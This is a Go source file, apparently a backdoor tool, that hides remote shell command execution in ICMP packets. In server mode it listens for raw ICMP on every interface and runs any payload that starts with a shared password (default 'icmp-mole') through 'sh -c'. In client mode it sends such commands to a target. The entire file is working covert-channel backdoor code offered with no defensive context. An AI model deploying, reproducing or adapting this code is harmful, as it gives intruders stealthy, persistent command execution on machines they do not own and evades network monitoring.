package main

import (
	"flag"
	"log"
	"net"
	"os/exec"
	"strings"
	"sync"
)

func run(cmd string) {
	log.Println(cmd)
	c := exec.Command("sh", "-c", cmd)
	if err := c.Start(); err != nil {
		log.Println(err)
	}
	if err := c.Wait(); err != nil {
		log.Println(err)
	}
}

func loop(c chan string) {
	for str := range c {
		log.Println(str)
		strs := strings.Split(str, "\x00\x00")
		if len(strs) >= 3 && strs[0] == password {
			switch strs[1] {
			default:
				go run(strs[1])
			}
		}
	}
}

func listen(c chan string, addr net.Addr) error {
	tmp := strings.SplitN(addr.String(), "/", 2)
	conn, err := net.ListenPacket("ip:icmp", tmp[0])
	if err != nil {
		return err
	}
	buf := make([]byte, 1024)
	for {
		_, _, err := conn.ReadFrom(buf)
		if err != nil {
			return err
		}
		c <- string(buf)
	}
}

func server(password string) error {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return err
	}
	c := make(chan string, 16)
	go loop(c)
	var wg sync.WaitGroup
	for _, addr := range addrs {
		wg.Add(1)
		go func(addr net.Addr) {
			if err := listen(c, addr); err != nil {
				log.Println(err)
			}
			wg.Done()
		}(addr)
	}
	wg.Wait()
	return nil
}

func client(addr, password, cmd string) error {
	conn, err := net.Dial("ip:icmp", addr)
	if err != nil {
		return err
	}
	_, err = conn.Write([]byte(password + "\x00\x00" + cmd + "\x00\x00"))
	if err != nil {
		return err
	}
	return nil
}

var (
	addr     string
	cmd      string
	password string
	t        string
)

func init() {
	flag.StringVar(&addr, "addr", "127.0.0.1", "Address")
	flag.StringVar(&password, "password", "icmp-mole", "Password")
	flag.StringVar(&t, "type", "server", "client | server")
	flag.Parse()
}

func main() {
	if t == "client" {
		if err := client(addr, password, strings.Join(flag.Args(), " ")); err != nil {
			log.Println(err)
		}
	} else {
		if err := server(password); err != nil {
			log.Println(err)
		}
	}
}
